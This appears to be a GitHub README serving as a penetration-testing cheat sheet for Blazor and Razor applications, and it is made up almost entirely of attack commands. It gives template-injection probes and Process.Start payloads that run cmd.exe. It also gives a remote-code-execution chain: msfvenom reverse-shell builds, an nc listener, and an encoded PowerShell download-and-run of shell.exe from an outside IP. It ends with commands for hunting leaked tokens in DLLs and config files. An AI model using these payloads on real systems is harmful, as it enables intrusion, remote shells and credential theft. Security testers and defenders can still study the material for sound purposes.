# blazor-pentest

**Blazor SSTI**
```
@(2+2) <= Success
@() <= Success
@("{{code}}") <= Success
@ <=Success
@{} <= ERROR!
@{ <= ERRROR!
@({}) <= ERROR!
@({{}}) <= ERROR!
```
![image](https://github.com/reewardius/blazor-pentest/assets/68978608/6a12d235-a055-40b1-9472-aa8fb6a6f36a)
```
@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");
@(System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test2.txt"));
```
![image](https://github.com/reewardius/blazor-pentest/assets/68978608/4dd6b312-7c87-4e58-874d-7da8b9def01c)

**Blazor RCE**
```
https://www.schtech.co.uk/razor-pages-ssti-rce/

attacker: .\hostname.ps1
victim: @System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc <BASE64>");

Exploit:

x64: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.6.151 LPORT=4443 -f exe -o shell.exe
x86: msfvenom -p windows/shell_reverse_tcp LHOST=10.11.6.151 LPORT=4443 –f exe > shell.exe
nc -lvp 4443

#generatePayload.ps1 .\generatePayload.ps1

$command = 'iwr -uri http://192.168.2.111/м -OutFile C:\Windows\Tasks\shell.exe; C:\Windows\Tasks\shell.exe'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc <BASE64>");
```
![image](https://github.com/reewardius/blazor-pentest/assets/68978608/56082313-28b6-4020-b3c2-b06d6cd908cb)

**Blazor Parse DLL**
```
> python blazor.py -u https://devtest-chat.tweppy.com/
  
> python blazor.py -l targets.txt
  
> python blazor.py -l targets.txt -o output.txt
```

**Download DLL files + Checking for leaked secrets**
```
> python download.py

> python download.py -f result

> find . -name "*.dll" | xargs -P $(nproc) -n 1 strings >> juicy
> nuclei -target juicy -tags token -es unknown -silent

```

**Blazor Config Files**
```
http://domain.com/appsettings.json

http://domain.com/appsettings.StageName.json

ffuf -w bbFuzzing.txt -u http://domain.com/FUZZ
```
![image](https://github.com/reewardius/blazor-pentest/assets/68978608/978d69f4-0d43-44ca-ad9b-a045d73af6b4)


**Nuclei**
```
> nuclei -u http://domain.com -tags blazor -silent

> nuclei -l targets.txt -silent
```

**Nuclei Secrets**
```
> getJS --url targets.txt --output secrets.txt
> nuclei -l secrets.txt -tags token -es unknown -silent
```
